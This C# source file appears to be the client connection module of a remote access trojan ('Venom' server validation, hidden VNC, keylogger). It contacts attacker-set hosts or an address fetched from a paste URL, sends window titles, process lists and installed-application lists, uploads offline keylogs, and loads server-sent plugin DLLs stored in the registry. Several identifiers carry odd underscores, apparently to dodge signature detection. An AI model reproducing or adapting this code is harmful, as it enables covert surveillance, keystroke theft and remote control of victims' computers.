using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using Client.Helper;
using MessagePackLib.MessagePack;
using Params;

namespace Client.Connection;

public static class ClientSocket
{
	public static List<MsgPack> Packs = new List<MsgPack>();

	public static Socket TcpClient { get; set; }

	public static SslStream SslClient { get; set; }

	private static byte[] Buffer { get; set; }

	private static long HeaderSize { get; set; }

	private static long Offset { get; set; }

	private static Timer KeepAlive { get; set; }

	public static bool IsConnected { get; set; }

	private static object SendSync { get; } = new object();

	private static Timer Ping { get; set; }

	public static int Interval { get; set; }

	public static bool ActivatePo_ng { get; set; }

	public static void InitializeClient()
	{
		try
		{
			TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			{
				ReceiveBufferSize = 51200,
				SendBufferSize = 51200
			};
			if (Settings.Paste_bin == "null")
			{
				string text = Settings.Hos_ts.Split(new char[1] { ',' })[new Random().Next(Settings.Hos_ts.Split(new char[1] { ',' }).Length)];
				int port = Convert.ToInt32(Settings.Por_ts.Split(new char[1] { ',' })[new Random().Next(Settings.Por_ts.Split(new char[1] { ',' }).Length)]);
				if (IsValidDomainName(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					foreach (IPAddress address in hostAddresses)
					{
						try
						{
							TcpClient.Connect(address, port);
							if (TcpClient.Connected)
							{
								break;
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					TcpClient.Connect(text, port);
				}
			}
			else
			{
				using WebClient webClient = new WebClient();
				NetworkCredential credentials = new NetworkCredential("", "");
				webClient.Credentials = credentials;
				string[] array = webClient.DownloadString(Settings.Paste_bin).Split(new string[1] { ":" }, StringSplitOptions.None);
				Settings.Hos_ts = array[0];
				Settings.Por_ts = array[new Random().Next(1, array.Length)];
				TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
			}
			if (TcpClient.Connected)
			{
				IsConnected = true;
				SslClient = new SslStream(new NetworkStream(TcpClient, ownsSocket: true), leaveInnerStreamOpen: false, ValidateVenomServer);
				SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
				HeaderSize = 4L;
				Buffer = new byte[HeaderSize];
				Offset = 0L;
				Send(IdSender.SendInfo());
				Interval = 0;
				ActivatePo_ng = false;
				KeepAlive = new Timer(KeepAlivePacket, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				Ping = new Timer(Po_ng, null, 1, 1);
				SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
			}
			else
			{
				IsConnected = false;
			}
		}
		catch
		{
			IsConnected = false;
		}
	}

	private static bool IsValidDomainName(string name)
	{
		return Uri.CheckHostName(name) != UriHostNameType.Unknown;
	}

	private static bool ValidateVenomServer(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return Settings.Server_Certificate.Equals(certificate);
	}

	public static void Reconnect()
	{
		try
		{
			Ping?.Dispose();
			KeepAlive?.Dispose();
			SslClient?.Dispose();
			TcpClient?.Dispose();
		}
		catch
		{
		}
		IsConnected = false;
	}

	public static void ReadServertData(IAsyncResult ar)
	{
		try
		{
			if (!TcpClient.Connected || !IsConnected)
			{
				IsConnected = false;
				return;
			}
			int num = SslClient.EndRead(ar);
			if (num > 0)
			{
				Offset += num;
				HeaderSize -= num;
				if (HeaderSize == 0L)
				{
					HeaderSize = BitConverter.ToInt32(Buffer, 0);
					if (HeaderSize > 0)
					{
						Offset = 0L;
						Buffer = new byte[HeaderSize];
						while (HeaderSize > 0)
						{
							int num2 = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
							if (num2 <= 0)
							{
								IsConnected = false;
								return;
							}
							Offset += num2;
							HeaderSize -= num2;
							if (HeaderSize < 0)
							{
								IsConnected = false;
								return;
							}
						}
						new Thread(Read).Start(Buffer);
						Offset = 0L;
						HeaderSize = 4L;
						Buffer = new byte[HeaderSize];
					}
					else
					{
						HeaderSize = 4L;
						Buffer = new byte[HeaderSize];
						Offset = 0L;
					}
				}
				else if (HeaderSize < 0)
				{
					IsConnected = false;
					return;
				}
				SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
			}
			else
			{
				IsConnected = false;
			}
		}
		catch
		{
			IsConnected = false;
		}
	}

	public static void Send(byte[] msg)
	{
		lock (SendSync)
		{
			try
			{
				if (!IsConnected)
				{
					return;
				}
				byte[] bytes = BitConverter.GetBytes(msg.Length);
				TcpClient.Poll(-1, SelectMode.SelectWrite);
				SslClient.Write(bytes, 0, bytes.Length);
				if (msg.Length > 1000000)
				{
					using (MemoryStream memoryStream = new MemoryStream(msg))
					{
						int num = 0;
						memoryStream.Position = 0L;
						byte[] array = new byte[50000];
						while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
						{
							TcpClient.Poll(-1, SelectMode.SelectWrite);
							SslClient.Write(array, 0, num);
							SslClient.Flush();
						}
						return;
					}
				}
				TcpClient.Poll(-1, SelectMode.SelectWrite);
				SslClient.Write(msg, 0, msg.Length);
				SslClient.Flush();
			}
			catch
			{
				IsConnected = false;
			}
		}
	}

	public static void KeepAlivePacket(object obj)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
			msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
			Send(msgPack.Encode2Bytes());
			GC.Collect();
			ActivatePo_ng = true;
		}
		catch
		{
		}
	}

	private static void Po_ng(object obj)
	{
		try
		{
			if (ActivatePo_ng && IsConnected)
			{
				Interval++;
			}
		}
		catch
		{
		}
	}

	public static void Read(object data)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.DecodeFromBytes((byte[])data);
			switch (msgPack.ForcePathObject("Pac_ket").AsString)
			{
			case "init_reg":
			{
				SetRegistry.InitRegistry();
				MsgPack msgPack7 = new MsgPack();
				msgPack7.ForcePathObject("Pac_ket").SetAsString("init_reg");
				Send(msgPack7.Encode2Bytes());
				break;
			}
			case "loadofflinelog":
			{
				string text = "";
				if (File.Exists(KeylogParams.OfflineSaveFileName))
				{
					text = File.ReadAllText(KeylogParams.OfflineSaveFileName);
					File.Delete(KeylogParams.OfflineSaveFileName);
				}
				Logger.Log("\nOfflineKeylog sending....\n" + text);
				MsgPack msgPack6 = new MsgPack();
				msgPack6.ForcePathObject("Pac_ket").SetAsString("offlinelog");
				msgPack6.ForcePathObject("log").SetAsString(text);
				Send(msgPack6.Encode2Bytes());
				break;
			}
			case "Po_ng":
			{
				ActivatePo_ng = false;
				MsgPack msgPack5 = new MsgPack();
				msgPack5.ForcePathObject("Pac_ket").SetAsString("Po_ng");
				msgPack5.ForcePathObject("Message").SetAsInteger(Interval);
				Send(msgPack5.Encode2Bytes());
				Interval = 0;
				break;
			}
			case "plu_gin":
				try
				{
					string asString = msgPack.ForcePathObject("Dll").AsString;
					if (SetRegistry.GetValue(asString) == null)
					{
						Packs.Add(msgPack);
						MsgPack msgPack4 = new MsgPack();
						msgPack4.ForcePathObject("Pac_ket").SetAsString("sendPlugin");
						msgPack4.ForcePathObject("Hashes").SetAsString(asString);
						Send(msgPack4.Encode2Bytes());
					}
					else
					{
						Invoke(msgPack);
					}
					break;
				}
				catch (Exception ex)
				{
					Error(ex.Message);
					break;
				}
			case "save_Plugin":
				SetRegistry.SetValue(msgPack.ForcePathObject("Hash").AsString, msgPack.ForcePathObject("Dll").GetAsBytes());
				{
					foreach (MsgPack item in Packs.ToList())
					{
						if (item.ForcePathObject("Dll").AsString == msgPack.ForcePathObject("Hash").AsString)
						{
							Invoke(item);
							Packs.Remove(item);
						}
					}
					break;
				}
			case "HVNCStop":
				Program.StopHVNC();
				break;
			case "keylogsetting":
				Keylogger.Params.content = msgPack.ForcePathObject("value").AsString;
				Keylogger.Params.SaveToFile();
				break;
			case "runningapp":
			{
				MsgPack msgPack3 = new MsgPack();
				msgPack3.ForcePathObject("Pac_ket").SetAsString("runningapp");
				msgPack3.ForcePathObject("hwid").SetAsString(Settings.Hw_id);
				msgPack3.ForcePathObject("value").SetAsString(CGRInfo.GetUserProcessList());
				Send(msgPack3.Encode2Bytes());
				break;
			}
			case "filterinfo":
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").SetAsString("filterinfo");
				msgPack2.ForcePathObject("hwid").SetAsString(Settings.Hw_id);
				msgPack2.ForcePathObject("apps").SetAsString(CGRInfo.GetInstalledApplications());
				msgPack2.ForcePathObject("running").SetAsString(CGRInfo.GetUserProcessList());
				Send(msgPack2.Encode2Bytes());
				break;
			}
			}
		}
		catch (Exception ex2)
		{
			Error(ex2.Message);
		}
	}

	private static void Invoke(MsgPack unpack_msgpack)
	{
		byte[] rawAssembly = Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString));
		dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(rawAssembly).GetType("Plugin.Plugin"));
		string asString = unpack_msgpack.ForcePathObject("Info").AsString;
		try
		{
			if (string.IsNullOrEmpty(asString))
			{
				val.Run(TcpClient, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
			}
			else if (asString == "hvnc")
			{
				Program.StopHVNC();
				int num = (int)unpack_msgpack.ForcePathObject("HPort").AsInteger;
				val.Run(Settings.Hos_ts, num);
			}
			Received();
		}
		catch (Exception)
		{
		}
	}

	private static void Received()
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));
		Send(msgPack.Encode2Bytes());
		Thread.Sleep(1000);
	}

	public static void Error(string ex)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "Error";
		msgPack.ForcePathObject("Error").AsString = ex;
		Send(msgPack.Encode2Bytes());
	}
}
